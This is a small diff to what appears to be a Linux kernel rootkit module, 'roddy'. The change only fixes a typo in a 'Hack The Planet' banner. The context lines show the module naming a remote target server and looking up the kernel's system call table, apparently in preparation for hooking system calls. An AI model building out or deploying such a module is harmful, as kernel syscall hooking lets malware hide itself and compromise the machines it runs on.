@@ -545,7 +545,7 @@ static int __init roddy_init(void) {
     printk(KERN_INFO "==========================================================\n"); 
     printk(KERN_INFO "[r0ddy] Initializing roddy v3.0\n"); 
     printk(KERN_INFO "[r0ddy] Target server: %s:%d%s\n", WEB_SERVER_IP, WEB_SERVER_PORT, WEB_ENDPOINT); 
-    printk(KERN_INFO "[trev]  Hsck The Planet\n"); 
+    printk(KERN_INFO "[trev]  Hack The Planet\n"); 
     printk(KERN_INFO "==========================================================\n");  
 
     sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
